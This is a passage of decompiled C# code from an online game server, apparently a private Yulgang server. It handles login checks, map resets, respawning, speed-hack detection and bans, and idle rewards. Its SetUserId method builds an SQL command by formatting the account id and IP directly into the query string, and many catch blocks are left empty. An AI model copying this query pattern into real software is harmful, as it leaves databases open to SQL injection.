						记算夫妻武功攻击力数据();
					}
					if (base.Player_Job == 7)
					{
						登记玉连环();
					}
					上次坐标X = base.人物坐标_X;
					上次坐标Y = base.人物坐标_Y;
					if (base.Player_Job == 11 && base.人物_AP < base.人物最大_AP)
					{
						base.人物_AP = base.人物最大_AP;
						if (障力恢复时间计数器 != null)
						{
							障力恢复时间计数器.Enabled = false;
							障力恢复时间计数器.Close();
							障力恢复时间计数器.Dispose();
						}
						障力恢复时间计数器 = new System.Timers.Timer(1000.0);
						障力恢复时间计数器.Elapsed += 障力恢复;
						障力恢复时间计数器.Enabled = true;
						障力恢复时间计数器.AutoReset = true;
					}
				}
				else
				{
					封号(72, base.Userid, "非法人物职业_人物登陆3");
				}
			}
			catch
			{
			}
		}

		public static void SetUserId(string id, string ip)
		{
			DBA.ExeSqlCommand(string.Format("EXEC      update_ACCOUNT      '{0}','{1}'", id, ip), "rxjhaccount");
		}

		public void 计算爱情度等级(int 情侣爱情度)
		{
			try
			{
				if (base.FLD_情侣_爱情度 >= 35000)
				{
					base.FLD_情侣_爱情度 = 35000;
					FLD_爱情度等级 = 1;
				}
				else if (base.FLD_情侣_爱情度 > 30000)
				{
					FLD_爱情度等级 = 1;
				}
				else if (base.FLD_情侣_爱情度 > 21000)
				{
					FLD_爱情度等级 = 2;
				}
				else if (base.FLD_情侣_爱情度 > 14700)
				{
					FLD_爱情度等级 = 3;
				}
				else if (base.FLD_情侣_爱情度 > 10290)
				{
					FLD_爱情度等级 = 4;
				}
				else if (base.FLD_情侣_爱情度 > 7203)
				{
					FLD_爱情度等级 = 5;
				}
				else if (base.FLD_情侣_爱情度 > 5042)
				{
					FLD_爱情度等级 = 6;
				}
				else if (base.FLD_情侣_爱情度 > 3025)
				{
					FLD_爱情度等级 = 7;
				}
				else if (base.FLD_情侣_爱情度 > 1513)
				{
					FLD_爱情度等级 = 8;
				}
				else if (base.FLD_情侣_爱情度 > 605)
				{
					FLD_爱情度等级 = 9;
				}
				else
				{
					FLD_爱情度等级 = 10;
				}
			}
			catch
			{
			}
		}

		public void 重置地图()
		{
			try
			{
				switch (base.人物坐标_地图)
				{
				case 801:
					if (World.势力战掉线玩家 != null)
					{
						string value = string.Empty;
						if (World.势力战掉线玩家.TryGetValue(base.UserName, out value))
						{
							base.势力战派别 = value;
							World.conn.发送("移除势力战掉线|" + base.UserName + "|" + base.势力战派别);
							if (Buffer.IsEquals(base.势力战派别, "仙族"))
							{
								换线移动(520f, 0f, 15f, 801);
								World.势力战正人数++;
							}
							else if (Buffer.IsEquals(base.势力战派别, "魔族"))
							{
								换线移动(-520f, 0f, 15f, 801);
								World.势力战邪人数++;
							}
							World.conn.发送("势力战人数|" + World.势力战正人数 + "|" + World.势力战邪人数);
						}
						else
						{
							移动(529f, 1528f, 15f, 101);
						}
					}
					else
					{
						移动(529f, 1528f, 15f, 101);
					}
					break;
				case 2301:
				case 2311:
				case 2341:
				case 3001:
				case 3101:
				case 7001:
				case 7101:
				case 7301:
				case 9001:
				case 9101:
				case 9201:
				case 25208:
				case 25209:
				case 25210:
				case 30000:
				case 30100:
				case 30200:
				case 30300:
				case 32002:
					移动(529f, 1528f, 15f, 101);
					break;
				}
			}
			catch
			{
			}
		}

		public void 新手上线()
		{
			try
			{
				if (base.Player_Level == 1 && World.上线送礼包套装 != 0)
				{
					装备栏包裹[35] = new 物品类(new byte[73]);
					增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(World.上线送礼包套装), 35, Buffer.GetBytes(1), new byte[56]);
				}
				if (World.是否开启新手上线设置 == 1 && base.Player_Level == 1)
				{
					World.脚本.设置玩家等级(base.人物全服ID, World.上线等级);
					新学气功(5, 1);
					新学气功(6, 1);
					新学气功(7, 1);
					新学气功(8, 1);
					新学气功(9, 1);
					新学气功(10, 1);
				/*witch (base.Player_Job)
					{
					case 1:
						foreach (升天气功总类 value in World.升天气功List.Values)
						{
							if (value.人物职业1 == 1)
							{
								增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(value.物品ID), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
							}
						}
						break;
					case 2:
						增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000000247), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
						foreach (升天气功总类 value2 in World.升天气功List.Values)
						{
							if (value2.人物职业2 == 1)
							{
								增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(value2.物品ID), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
							}
						}
						break;
					case 3:
						foreach (升天气功总类 value3 in World.升天气功List.Values)
						{
							if (value3.人物职业3 == 1)
							{
								增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(value3.物品ID), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
							}
						}
						break;
					case 4:
						foreach (升天气功总类 value4 in World.升天气功List.Values)
						{
							if (value4.人物职业4 == 1)
							{
								增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(value4.物品ID), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
							}
						}
						break;
					case 5:
						增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000000313), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
						增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000000314), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
						增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000000315), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
						增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000000316), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
						增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000000317), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
						foreach (升天气功总类 value5 in World.升天气功List.Values)
						{
							if (value5.人物职业5 == 1)
							{
								增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(value5.物品ID), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
							}
						}
						break;
					case 6:
						foreach (升天气功总类 value6 in World.升天气功List.Values)
						{
							if (value6.人物职业6 == 1)
							{
								增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(value6.物品ID), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
							}
						}
						break;
					case 7:
						foreach (升天气功总类 value7 in World.升天气功List.Values)
						{
							if (value7.人物职业7 == 1)
							{
								增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(value7.物品ID), 得到包裹空位(this), Buffer.GetBytes(1), new byte[20]);
							}
						}
						break;
					case 8:
						增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000000570), 得到包裹空位(this), Buffer.GetBytes(1), new byte[20]);
						增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000000564), 得到包裹空位(this), Buffer.GetBytes(1), new byte[20]);
						增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000000565), 得到包裹空位(this), Buffer.GetBytes(1), new byte[20]);
						增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000000566), 得到包裹空位(this), Buffer.GetBytes(1), new byte[20]);
						foreach (升天气功总类 value8 in World.升天气功List.Values)
						{
							if (value8.人物职业8 == 1)
							{
								增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(value8.物品ID), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
							}
						}
						break;
					case 9:
						增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000001009), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
						foreach (升天气功总类 value9 in World.升天气功List.Values)
						{
							if (value9.人物职业9 == 1)
							{
								增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(value9.物品ID), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
							}
						}
						break;
					case 10:
						foreach (升天气功总类 value10 in World.升天气功List.Values)
						{
							if (value10.人物职业10 == 1)
							{
								增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(value10.物品ID), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
							}
						}
						break;
					case 11:
						foreach (升天气功总类 value11 in World.升天气功List.Values)
						{
							if (value11.人物职业11 == 1)
							{
								增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(value11.物品ID), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
							}
						}
						break;
					case 12:
						foreach (升天气功总类 value12 in World.升天气功List.Values)
						{
							if (value12.人物职业12 == 1)
							{
								增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(value12.物品ID), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
							}
						}
						break;
					case 13:
						foreach (升天气功总类 value13 in World.升天气功List.Values)
						{
							if (value13.人物职业13 == 1)
							{
								增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(value13.物品ID), 得到包裹空位(this), Buffer.GetBytes(1), new byte[56]);
							}
						}
						break;
					}*/
					更新人物数据(this);
					更新武功和状态();
				}
			}
			catch
			{
			}
		}

		public void 结婚BUFF()
		{
			try
			{
				if (是否已婚 == 1)
				{
					if (GetAddState(242))
					{
						追加状态列表[242].时间结束事件();
					}
					追加状态列表.Add(242, new 追加状态类(this, 604800000, 242, 0));
					状态效果(242, 1, 1, 3600000);
					base.FLD_人物_追加_攻击 += 15;
					base.FLD_人物_追加_防御 += 15;
					base.人物追加最大_HP += 300;
					base.人物追加最大_MP += 300;
					base.FLD_人物_追加_回避 += 15;
					base.FLD_人物_追加_经验百分比 += 0.2;
					base.FLD_结婚礼物_追加_属性石 = 1;
				}
			}
			catch
			{
			}
		}

		public void 更新移动速度()
		{
			try
			{
				最大移动速度 = float.Parse(World.移动速度[1]);
				if (追加状态列表 == null)
				{
					追加状态列表 = new ThreadSafeDictionary<int, 追加状态类>();
				}
				if (追加状态列表.ContainsKey(601101))
				{
					最大移动速度 = float.Parse(World.移动速度[2]);
				}
				else if (追加状态列表.ContainsKey(601102))
				{
					最大移动速度 = float.Parse(World.移动速度[3]);
				}
				else if (追加状态列表.ContainsKey(601103))
				{
					最大移动速度 = float.Parse(World.移动速度[4]);
				}
				else if (人物灵兽 != null && 人物灵兽.骑 == 1)
				{
					最大移动速度 = float.Parse(World.移动速度[5]);
				}
				else if (跑走)
				{
					最大移动速度 = float.Parse(World.移动速度[1]);
				}
				else if (!跑走)
				{
					最大移动速度 = float.Parse(World.移动速度[0]);
				}
			}
			catch (Exception ex)
			{
				最大移动速度 = 100f;
				Form1.WriteLine(100, "更新移动速度()  出错[" + base.Userid + "]-[" + base.UserName + "]  " + ex.Message);
			}
		}

		public void 死亡回城(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				System.Buffer.BlockCopy(封包数据, 10, array, 0, 1);
				switch (BitConverter.ToInt32(array, 0))
				{
				case 8:
					if (GM模式 == 8)
					{
						移动(BitConverter.ToSingle(封包数据, 14), BitConverter.ToSingle(封包数据, 22), 15f, base.人物坐标_地图);
					}
					else
					{
						系统提示("请不要使用无敌外  挂，你的ID已被系统记录，多次使用系统会自动封号。");
						Form1.WriteLine(2, "使用无敌外挂[" + base.Userid + "]-[" + base.UserName + "]");
						if (base.Client != null)
						{
							base.Client.Dispose();
						}
					}
					break;
				case 99:
					if (base.人物坐标_地图 == 42101)
					{
						DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("select  *  from  [攻城城主]  "));
						string a = dBToDataTable.Rows[0]["攻城行会名"].ToString();
						byte[] array2 = new byte[4];
						System.Buffer.BlockCopy(封包数据, 30, array2, 0, 1);
						string 帮派名字 = base.帮派名字;
						if (a == 帮派名字)
						{
							if (BitConverter.ToInt32(array2, 0) == 1)
							{
								base.Player死亡 = false;
								天魔移动(-115f, 461f, 15f, 42101);
								base.人物_HP = base.人物最大_HP;
								更新HP_MP_SP();
								获取复查范围玩家();
								获取复查范围Npc();
								获取复查范围地面物品();
							}
							else
							{
								base.Player死亡 = false;
								天魔移动(-769f, 462f, 15f, 42101);
								base.人物_HP = base.人物最大_HP;
								更新HP_MP_SP();
								获取复查范围玩家();
								获取复查范围Npc();
								获取复查范围地面物品();
							}
						}
						else if (BitConverter.ToInt32(array2, 0) == 1)
						{
							base.Player死亡 = false;
							天魔移动(205f, 467f, 15f, 42101);
							base.人物_HP = base.人物最大_HP;
							更新HP_MP_SP();
							获取复查范围玩家();
							获取复查范围Npc();
							获取复查范围地面物品();
						}
						else
						{
							base.Player死亡 = false;
							天魔移动(-430f, -653f, 15f, 42101);
							base.人物_HP = base.人物最大_HP;
							更新HP_MP_SP();
							获取复查范围玩家();
							获取复查范围Npc();
							获取复查范围地面物品();
						}
						dBToDataTable.Dispose();
					}
					else
					{
						base.Player死亡 = false;
						bool flag = false;
						foreach (坐标Class item in World.移动)
						{
							if (item.Rxjh_Map == base.人物坐标_地图)
							{
								死亡移动(item.Rxjh_X, item.Rxjh_Y, item.Rxjh_Z, item.Rxjh_Map);
								flag = true;
								break;
							}
						}
						if (!flag)
						{
							死亡移动(529f, 1528f, 15f, 101);
						}
						base.人物_HP = base.人物最大_HP;
						更新HP_MP_SP();
						获取复查范围玩家();
						获取复查范围Npc();
						获取复查范围地面物品();
					}
					break;
				case 1:
				case 100:
				case 102:
				case 105:
					if (base.人物坐标_地图 == 42101)
					{
						for (int i = 0; i < 36; i++)
						{
							if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1000001504 && BitConverter.ToInt32(装备栏包裹[i].物品数量, 0) >= 100)
							{
								减去物品(i, 100);
								死亡移动(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
								base.人物_HP = base.人物最大_HP;
								更新HP_MP_SP();
								base.Player死亡 = false;
							}
						}
					}
					else
					{
						死亡移动(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
						base.人物_HP = base.人物最大_HP;
						更新HP_MP_SP();
						base.Player死亡 = false;
					}
					break;
				case 88:
					传送点移动(封包数据, 封包大小);
					break;
				}
				if (PK死亡)
				{
					PK死亡 = false;
					if (无敌时间计数器 != null)
					{
						无敌时间计数器.Enabled = false;
						无敌时间计数器.Close();
						无敌时间计数器.Dispose();
					}
					Player无敌 = true;
					无敌时间计数器 = new System.Timers.Timer(1500.0);
					无敌时间计数器.Elapsed += 时间结束事件1;
					无敌时间计数器.Enabled = true;
					无敌时间计数器.AutoReset = false;
				}
				if (人物灵兽 != null && !人物灵兽.死亡 && 人物灵兽.FLD_ZCD > 100)
				{
					召唤提示(0, 1);
					人物灵兽.人物坐标_X = base.人物坐标_X;
					人物灵兽.人物坐标_Y = base.人物坐标_Y;
					人物灵兽.人物坐标_Z = base.人物坐标_Z;
					人物灵兽.人物坐标_MAP = base.人物坐标_地图;
					召唤更新显示灵兽数据(this);
					更新灵兽HP_MP_SP();
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "死亡回城出错[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 时间结束事件1(object sender, ElapsedEventArgs e)
		{
			Player无敌 = false;
		}

		private void 计算速度(float x, float y)
		{
			int num = (int)DateTime.Now.Subtract(移动时间).TotalMilliseconds;
			移动时间 = DateTime.Now;
			float num2 = x - 上次坐标X;
			float num3 = y - 上次坐标Y;
			float num4 = (float)Math.Sqrt((double)num2 * (double)num2 + (double)num3 * (double)num3) * 1000f / (float)num;
			bool flag = false;
			if (人物灵兽 != null && 人物灵兽.骑 == 1)
			{
				flag = true;
			}
			if ((double)num4 <= (double)最大移动速度 || Speed.ToString("F2") == "正无穷大")
			{
				return;
			}
			yxsl++;
			if (yxsl <= World.三十秒内允许超出次数)
			{
				return;
			}
			switch (World.最大速度超出次数操作)
			{
			case 0:
				Form1.WriteLine(100, "移动超出最大速度[" + 最大移动速度 + "]  骑宠[" + flag + "]  行走ID[" + 行走状态id + "]  职业[" + base.Player_Job + "]  账号[" + base.Userid + "]  人物[" + base.UserName + "]  当前速度:" + num4.ToString("F2"));
				break;
			case 1:
				Form1.WriteLine(100, "移动超出最大速度[" + 最大移动速度 + "]  骑宠[" + flag + "]  行走ID[" + 行走状态id + "]  职业[" + base.Player_Job + "]  账号[" + base.Userid + "]  人物[" + base.UserName + "]  当前速度:" + num4.ToString("F2"));
				break;
			case 2:
				Form1.WriteLine(100, "移动超出最大速度[" + 最大移动速度 + "]  骑宠[" + flag + "]  行走ID[" + 行走状态id + "]  职业[" + base.Player_Job + "]  账号[" + base.Userid + "]  人物[" + base.UserName + "]  当前速度:" + num4.ToString("F2"));
				if (base.Client != null)
				{
					base.Client.Dispose();
				}
				break;
			case 3:
				封号(72, base.Userid, "移动超出最大速度");
				break;
			}
		}

		public void 人物移动(byte[] 封包数据, int 封包大小)
		{
			try
			{
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				byte[] dst = new byte[4];
				byte[] array3 = new byte[4];
				byte[] array4 = new byte[4];
				byte[] dst2 = new byte[4];
				byte[] array5 = new byte[4];
				byte[] dst3 = new byte[4];
				byte[] dst4 = new byte[4];
				byte[] array6 = new byte[4];
				System.Buffer.BlockCopy(封包数据, 4, array6, 0, 2);
				System.Buffer.BlockCopy(封包数据, 10, dst3, 0, 4);
				System.Buffer.BlockCopy(封包数据, 14, array, 0, 4);
				System.Buffer.BlockCopy(封包数据, 18, dst, 0, 4);
				System.Buffer.BlockCopy(封包数据, 22, array2, 0, 4);
				System.Buffer.BlockCopy(封包数据, 26, array3, 0, 4);
				System.Buffer.BlockCopy(封包数据, 30, dst2, 0, 4);
				System.Buffer.BlockCopy(封包数据, 34, array4, 0, 4);
				System.Buffer.BlockCopy(封包数据, 42, array5, 0, 4);
				System.Buffer.BlockCopy(封包数据, 46, dst4, 0, 4);
				int num = BitConverter.ToInt32(array6, 0);
				if ((double)BitConverter.ToSingle(array5, 0) != 0.0 && num == base.人物全服ID && 个人商店 == null && !base.Player死亡 && base.人物_HP > 0 && !退出中 && !交易.交易中 && !进店中)
				{
					if (触发地图移动事件)
					{
						yxsl = 0;
					}
					float x = BitConverter.ToSingle(array3, 0);
					float y = BitConverter.ToSingle(array4, 0);
					计算速度(x, y);
					上次坐标X = x;
					上次坐标Y = y;
					PK死亡 = false;
					Player无敌 = false;
					if (自动攻击 != null)
					{
						自动攻击.Enabled = false;
						自动攻击.Close();
						自动攻击.Dispose();
						自动攻击 = null;
					}
					if (自动恢复 != null)
					{
						自动恢复.Enabled = false;
						自动恢复.Close();
						自动恢复.Dispose();
						自动恢复 = null;
					}
					base.人物坐标_X = BitConverter.ToSingle(array, 0);
					base.人物坐标_Y = BitConverter.ToSingle(array2, 0);
					byte[] array7 = new byte[封包大小];
					System.Buffer.BlockCopy(封包数据, 0, array7, 0, 封包大小);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array7, 4, 2);
					array7[6] = 101;
					System.Buffer.BlockCopy(BitConverter.GetBytes(15f), 0, array7, 18, 4);
					发送当前范围广播数据(array7, array7.Length);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "人物移动出错[" + base.Userid + "]-[" + base.UserName + "]" + Converter.ToString(封包数据) + "  " + ex.Message);
			}
		}

		public bool 检查玩家是否在挂机双倍区域(Players playe)
		{
			try
			{
				return playe.人物坐标_地图 == 101 && (double)playe.人物坐标_X < 720.0 && (double)playe.人物坐标_X > -40.0 && (double)playe.人物坐标_Y < 1360.0 && (double)playe.人物坐标_Y > 970.0;
			}
			catch
			{
				return false;
			}
		}

		public void MoveAll(object sender, ElapsedEventArgs e)
		{
			int num = 0;
			try
			{
				if ((int)DateTime.Now.Subtract(XThmtime).TotalMilliseconds >= World.心跳检测时长)
				{
					times = 0;
					yxsl = 0;
					XThmtime = DateTime.Now;
					组队Class value;
					if (组队阶段 == 1 && World.W组队.TryGetValue(组队id, out value) && value.队长.人物全服ID != base.人物全服ID)
					{
						byte[] array = Converter.hexStringToByte("AA5514002D0134000600010001002D01000000000000000055AA");
						System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
						System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 14, 2);
						对方取消组队(array, array.Length);
					}
				}
				if ((int)DateTime.Now.Subtract(TMJCtime).TotalMilliseconds >= 3)
				{
					TMJCtime = DateTime.Now;
					if (base.人物坐标_地图 == 42101 && !追加状态列表.ContainsKey(1008002169))
					{
						//移动(560f, 1550f, 15f, 101);
					}
				}
				num = 1;
				if ((int)DateTime.Now.Subtract(CWhmtime).TotalMinutes >= 5)
				{
					CWhmtime = DateTime.Now;
					if (人物灵兽 != null)
					{
						人物灵兽.FLD_ZCD -= 100 + 人物灵兽.FLD_LEVEL * 2;
						num = 2;
						if (人物灵兽.FLD_ZCD <= 100)
						{
							人物灵兽.FLD_ZCD = 0;
							宠物动作(6);
						}
						更新灵兽HP_MP_SP();
					}
				}
				if ((int)DateTime.Now.Subtract(SThmtime).TotalMinutes >= 5 && 师傅数据.TID != -1)
				{
					Players players = World.检查玩家name(师傅数据.STNAME);
					if (players != null)
					{
						int num2 = 2000;
						if (师傅数据.STLEVEL == 4)
						{
							num2 = 2000;
						}
						else if (师傅数据.STLEVEL == 3)
						{
							num2 = 2000;
						}
						else if (师傅数据.STLEVEL == 2)
						{
							num2 = 2000;
						}
						else if (师傅数据.STLEVEL == 1)
						{
							num2 = ((师傅数据.STYHD < 20000) ? 50 : 0);
						}
						师傅数据.TLEVEL = base.Player_Level;
						师傅数据.STYHD += num2;
						徒弟更新师徒系统();
						for (int i = 0; i < 3; i++)
						{
							if (players.徒弟数据[i].TID == 师傅数据.TID)
							{
								players.徒弟数据[i].TLEVEL = base.Player_Level;
								players.徒弟数据[i].STYHD += num2;
								players.师傅更新师徒系统(i);
								break;
							}
						}
						SThmtime = DateTime.Now;
						系统提示("在线" + 5 + "分钟得到2000点的贡献度。");
					}
				}
				num = 3;
				if (World.是否开启挂机奖励 == 1)
				{
					if ((int)DateTime.Now.Subtract(PKhmtime).TotalMinutes >= World.挂机奖励时间周期 && base.Player_Level >= World.挂机奖励要求等级)
					{
						PKhmtime = DateTime.Now;
						int num3 = 1;
						if (检查玩家是否在挂机双倍区域(this) && World.挂机双倍时间段.Length > 0)
						{
							if (Buffer.IsEquals(World.挂机双倍时间段, "0"))
							{
								num3 = 2;
								系统提示("您当前位置处于挂机双倍区域,将获得双倍奖励。");
							}
							else
							{
								string[] array2 = World.挂机双倍时间段.Split(';');
								if (DateTime.Now.Hour >= int.Parse(array2[0]) && DateTime.Now.Hour <= int.Parse(array2[1]))
								{
									num3 = 2;
									string[] array3 = new string[5]
									{
										"您当前处于挂机双倍时间段[每天",
										null,
										null,
										null,
										null
									};
									array3[1] = int.Parse(array2[0]).ToString();
									array3[2] = "~";
									array3[3] = int.Parse(array2[1]).ToString();
									array3[4] = "点]的区域,将获得双倍奖励。";
									系统提示(string.Concat(array3));
								}
							}
						}
						if (base.人物善恶 < 0)
						{
							if (World.挂机消除善恶 > 0)
							{
								base.人物善恶 += World.挂机消除善恶 * num3;
								更新武功和状态();
							}
						}
						else if (World.挂机奖励武勋 > 0 && base.FLD_VIP == 1)
						{
							base.Player_WuXun += World.挂机奖励武勋 * num3;
							更新武功和状态();
							string[] array4 = new string[5]
							{
								"在线",
								World.挂机奖励时间周期.ToString(),
								"分钟,得到武勋",
								null,
								null
							};
							array4[3] = (World.挂机奖励武勋 * num3).ToString();
							array4[4] = "点。";
							系统提示(string.Concat(array4));
						}
						查百宝阁元宝数();
						if (World.挂机奖励元宝 > 0)
						{
							检察元宝数据(World.挂机奖励元宝 * num3, 1);
						}
						if (World.挂机奖励赠品元宝 > 0)
						{
							检察华夏币数据(World.挂机奖励赠品元宝 * num3, 1);
						}
						保存元宝数据();
						if (World.挂机奖励金钱 > 0)
						{
							base.Player_Money += World.挂机奖励金钱 * num3;
							更新金钱和负重();
							string[] array5 = new string[5]
							{
								"在线",
								World.挂机奖励时间周期.ToString(),
								"分钟,得到",
								null,
								null
							};
							array5[3] = (World.挂机奖励金钱 * num3).ToString();
							array5[4] = "两游戏币。";
							系统提示(string.Concat(array5), 50, "系统提示");
						}
						FLD_是否可以送花 = true;
						检测婚姻状态();
					}
					num = 7;
				}
				else if (base.人物善恶 < 0)
				{
					if ((int)DateTime.Now.Subtract(PKhmtime).TotalMinutes >= World.挂机奖励时间周期)
					{
						PKhmtime = DateTime.Now;
						base.人物善恶 += 170;
						更新武功和状态();
						FLD_是否可以送花 = true;
						检测婚姻状态();
					}
					num = 8;
				}
				else
				{
					if ((int)DateTime.Now.Subtract(PKhmtime).TotalMinutes >= World.挂机奖励时间周期)
					{
						PKhmtime = DateTime.Now;
						系统提示("在线" + World.挂机奖励时间周期 + "分钟得到50点的武勋。");
						base.Player_WuXun += 50;
						更新武功和状态();
						FLD_是否可以送花 = true;
						检测婚姻状态();
					}
					num = 9;
				}
				num = 10;
				if (base.人物坐标_地图 == 32002)
				{
					int num4 = (int)DateTime.Now.Subtract(FBtime).TotalMinutes;
					if (num4 >= 3)
					{
						活动地图剩余时间 -= num4;
						FBtime = DateTime.Now;
					}
					if (活动地图剩余时间 <= 0)
					{
						系统提示("活动时间结束,自动传送到泫勃派。");
						移动(560f, 1550f, 15f, 101);
						活动地图剩余时间 = 0;
					}
				}
				num = 11;
				if (base.人物坐标_地图 == 30000 || base.人物坐标_地图 == 30100 || base.人物坐标_地图 == 30200 || base.人物坐标_地图 == 30300)
				{
					int num5 = (int)DateTime.Now.Subtract(FBtime).TotalMinutes;
					if (num5 >= 3)
					{
						修炼地图剩余时间 -= num5;
						FBtime = DateTime.Now;
					}
					if (修炼地图剩余时间 <= 0)
					{
						系统提示("修炼时间结束,自动传送到泫勃派。");
						移动(560f, 1550f, 15f, 101);
						修炼地图剩余时间 = 0;
					}
				}
				if (公有药品.Count > 0)
				{
					foreach (公有药品类 value3 in 公有药品.Values)
					{
						DateTime t = new DateTime(1970, 1, 1, 8, 0, 0).AddSeconds(value3.时间);
						if (t < DateTime.Now)
						{
							清理符(value3.药品ID);
						}
					}
				}
				num = 12;
				if (base.Client == null)
				{
					if (查坐标 != null)
					{
						查坐标.Close();
						查坐标.Dispose();
						查坐标 = null;
					}
				}
				else
				{
					num = 13;
					if (!base.Client.Running)
					{
						if (查坐标 != null)
						{
							查坐标.Close();
							查坐标.Dispose();
							查坐标 = null;
						}
					}
					else
					{
						num = 14;
						NetState value2;
						if (!World.list.TryGetValue(base.Client.WorldId, out value2))
						{
							base.Client.Dispose();
							Logout();
							Dispose();
						}
						else
						{
							num = 15;
							if (!MoveAllto(70, 新坐标))
							{
								num = 16;
								获取复查范围玩家();
								num = 17;
								获取复查范围Npc();
								num = 18;
								获取复查范围地面物品();
								num = 19;
								触发自动攻击();
								num = 20;
								新坐标.Rxjh_X = base.人物坐标_X;
								新坐标.Rxjh_Y = base.人物坐标_Y;
								新坐标.Rxjh_Map = base.人物坐标_地图;
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, num + "  MoveAll出错[" + base.人物全服ID + "]-[" + base.Userid + "]-[" + base.UserName + "]" + ((ex != null) ? ex.ToString() : null));
				Players players2 = World.检查玩家name(base.UserName);
				if (players2 != null && players2.Client != null)
				{
					players2.Client.Dispose();
				}
				Form1.WriteLine(1, "用户踢出[" + base.Userid + "]-[" + base.UserName + "]");
			}
		}

		public void 清理符(int ID)
		{
			switch (ID)
			{
			case 1008000058:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				break;
			case 1008000059:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				break;
			case 1008000060:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				break;
			case 1008000061:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				break;
			case 1008000062:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				break;
			case 1008000063:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				break;
			case 1008000027:
				base.FLD_人物_追加_经验百分比 -= 0.2;
